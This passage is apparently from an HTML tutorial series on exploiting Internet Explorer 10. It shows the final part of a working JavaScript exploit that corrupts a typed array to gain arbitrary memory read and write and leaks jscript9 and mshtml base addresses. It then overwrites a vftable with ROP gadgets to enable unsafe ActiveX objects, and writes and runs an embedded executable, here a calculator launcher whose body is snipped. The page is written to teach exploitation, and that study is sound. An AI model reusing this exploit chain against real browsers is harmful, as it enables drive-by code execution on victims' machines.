+        nextPtr3 = int32array[(0x60*3+0x24)/4];
+    if (vftptr1 &amp; 0xffff != 0x6e18 || vftptr1 != vftptr2 || vftptr2 != vftptr3 ||
+        nextPtr2 - nextPtr1 != 0x60 || nextPtr3 - nextPtr2 != 0x60) {
+      alert("Error!");
+      window.location.reload();
+      return;
+    }  
+    
+    buf_addr = nextPtr1 - 0x60*2;
+    
+    // Now we modify int32array again to gain full address space read/write access.
+    if (int32array[(0x0c0af000+0x1c - buf_addr)/4] != buf_addr) {
+      alert("Error!");
+      window.location.reload();
+      return;
+    }  
+    int32array[(0x0c0af000+0x18 - buf_addr)/4] = 0x20000000;        // new length
+    int32array[(0x0c0af000+0x1c - buf_addr)/4] = 0;                 // new buffer address
+ 
+    function read(address) {
+      var k = address &amp; 3;
+      if (k == 0) {
+        // ####
+        return int32array[address/4];
+      }
+      else {
+        alert("to debug");
+        // .### #... or ..## ##.. or ...# ###.
+        return (int32array[(address-k)/4] &gt;&gt; k*8) |
+               (int32array[(address-k+4)/4] &lt;&lt; (32 - k*8));
+      }
+    }
+    
+    function write(address, value) {
+      var k = address &amp; 3;
+      if (k == 0) {
+        // ####
+        int32array[address/4] = value;
+      }
+      else {
+        // .### #... or ..## ##.. or ...# ###.
+        alert("to debug");
+        var low = int32array[(address-k)/4];
+        var high = int32array[(address-k+4)/4];
+        var mask = (1 &lt;&lt; k*8) - 1;  // 0xff or 0xffff or 0xffffff
+        low = (low &amp; mask) | (value &lt;&lt; k*8);
+        high = (high &amp; (0xffffffff - mask)) | (value &gt;&gt; (32 - k*8));
+        int32array[(address-k)/4] = low;
+        int32array[(address-k+4)/4] = high;
+      }
+    }
+    
+    //---------
+    // God mode
+    //---------
+    
+    // At 0c0af000 we can read the vfptr of an Int32Array:
+    //   jscript9!Js::TypedArray&lt;int&gt;::`vftable' @ jscript9+3b60
+    jscript9 = read(0x0c0af000) - 0x3b60;
+    
+    // Now we need to determine the base address of MSHTML. We can create an HTML
+    // object and write its reference to the address 0x0c0af000-4 which corresponds
+    // to the last element of one of our arrays.
+    // Let's find the array at 0x0c0af000-4.
+    
+    for (i = 0x200; i &lt; 0x200 + 0x400; ++i)
+      a[i][0x3bf7] = 0;
+    
+    // We write 3 in the last position of one of our arrays. IE encodes the number x
+    // as 2*x+1 so that it can tell addresses (dword aligned) and numbers apart.
+    // Either we use an odd number or a valid address otherwise IE will crash in the
+    // following for loop.
+    write(0x0c0af000-4, 3);
+ 
+    leakArray = 0;
+    for (i = 0x200; i &lt; 0x200 + 0x400; ++i) {
+      if (a[i][0x3bf7] != 0) {
+        leakArray = a[i];
+        break;
+      }
+    }
+    if (leakArray == 0) {
+      alert("Can't find leakArray!");
+      window.location.reload();
+      return;
+    }
+    
+    function get_addr(obj) {
+      leakArray[0x3bf7] = obj;
+      return read(0x0c0af000-4, obj);
+    }
+    
+    // Back to determining the base address of MSHTML...
+    // Here's the beginning of the element div:
+    //      +----- jscript9!Projection::ArrayObjectInstance::`vftable'
+    //      v
+    //   70792248 0c012b40 00000000 00000003
+    //   73b38b9a 00000000 00574230 00000000
+    //      ^
+    //      +---- MSHTML!CBaseTypeOperations::CBaseFinalizer = mshtml + 0x58b9a
+    var addr = get_addr(document.createElement("div"));
+    mshtml = read(addr + 0x10) - 0x58b9a;
+
+    //                                                  vftable
+    //                                    +-----&gt; +------------------+
+    //                                    |       |                  |
+    //                                    |       |                  |
+    //                                    |  0x10:| jscript9+0x10705e| --&gt; "XCHG EAX,ESP | ADD EAX,71F84DC0 |
+    //                                    |       |                  |      MOV EAX,ESI | POP ESI | RETN"
+    //                                    |  0x14:| jscript9+0xdc164 | --&gt; "LEAVE | RET 4"
+    //                                    |       +------------------+
+    //                 object             |
+    // EAX ---&gt; +-------------------+     |
+    //          | vftptr            |-----+
+    //          | jscript9+0x15f800 | --&gt; "XOR EAX,EAX | RETN"
+    //          | jscript9+0xf3baf  | --&gt; "XCHG EAX,EDI | RETN"
+    //          | jscript9+0xdc361  | --&gt; "LEAVE | RET 4"
+    //          +-------------------+
+
+    var old = read(mshtml+0xc555e0+0x14);
+
+    write(mshtml+0xc555e0+0x14, jscript9+0xdc164);      // God Mode On!
+    var shell = new ActiveXObject("WScript.shell");
+    write(mshtml+0xc555e0+0x14, old);                   // God Mode Off!
+
+    addr = get_addr(ActiveXObject);
+    var pp_obj = read(read(addr + 0x28) + 4) + 0x1f0;       // ptr to ptr to object
+    
+    var old_objptr = read(pp_obj);
+    var old_vftptr = read(old_objptr);
+    
+    // Create the new vftable.
+    var new_vftable = new Int32Array(0x708/4);
+    for (var i = 0; i &lt; new_vftable.length; ++i)
+      new_vftable[i] = read(old_vftptr + i*4);
+    new_vftable[0x10/4] = jscript9+0x10705e;
+    new_vftable[0x14/4] = jscript9+0xdc164;
+    var new_vftptr = read(get_addr(new_vftable) + 0x1c);        // ptr to raw buffer of new_vftable
+    
+    // Create the new object.
+    var new_object = new Int32Array(4);
+    new_object[0] = new_vftptr;
+    new_object[1] = jscript9 + 0x15f800;
+    new_object[2] = jscript9 + 0xf3baf;
+    new_object[3] = jscript9 + 0xdc361;
+    var new_objptr = read(get_addr(new_object) + 0x1c);         // ptr to raw buffer of new_object
+    
+    function GodModeOn() {
+      write(pp_obj, new_objptr);
+    }
+    
+    function GodModeOff() {
+      write(pp_obj, old_objptr);
+    }
+    
+    // content of exe file encoded in base64.
+    runcalc = 'TVqQAAMAAAAEAAAA//8AALgAAAAAAAAA &lt;snipped&gt; AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA';
+ 
+    function createExe(fname, data) {
+      GodModeOn();
+      var tStream = new ActiveXObject("ADODB.Stream");
+      var bStream = new ActiveXObject("ADODB.Stream");
+      GodModeOff();
+      
+      tStream.Type = 2;       // text
+      bStream.Type = 1;       // binary
+      tStream.Open();
+      bStream.Open();
+      tStream.WriteText(data);
+      tStream.Position = 2;       // skips the first 2 bytes in the tStream (what are they?)
+      tStream.CopyTo(bStream);
+      
+      var bStream_addr = get_addr(bStream);
+      var string_addr = read(read(bStream_addr + 0x50) + 0x44);
+      write(string_addr, 0x003a0043);       // 'C:'
+      write(string_addr + 4, 0x0000005c);   // '\'
+      bStream.SaveToFile(fname, 2);     // 2 = overwrites file if it already exists
+      
+      tStream.Close();
+      bStream.Close();
+    }
+    
+    function decode(b64Data) {
+      var data = window.atob(b64Data);
+      
+       // Now data is like
+      //   11 00 12 00 45 00 50 00 ...
+      // rather than like
+      //   11 12 45 50 ...
+      // Let's fix this!
+      var arr = new Array();
+      for (var i = 0; i &lt; data.length / 2; ++i) {
+        var low = data.charCodeAt(i*2);
+        var high = data.charCodeAt(i*2 + 1);
+        arr.push(String.fromCharCode(low + high * 0x100));
+      }
+      return arr.join('');
+    }
+
+    fname = shell.ExpandEnvironmentStrings("%TEMP%\\runcalc.exe");
+    createExe(fname, decode(runcalc));
+    shell.Exec(fname);
+
+    alert("All done!");
+  })();
+
+&lt;/script&gt;
+&lt;/head&gt;
+&lt;body&gt;
+&lt;/body&gt;
+&lt;/html&gt;
+</code></pre>
+
+<p>As before, I snipped <span style="color: #00ff00;">runcalc</span>. You can download the full code from here: <a href="code/code3.zip">code3</a>.</p><p style="text-align: center; font-size: 40px;">← <a href="ie10-god-mode-1.html">Prev Part</a> | <a href="ie10-use-free-bug.html">Next Part</a> →</p> </div></div>
+
+</body>
+</html>
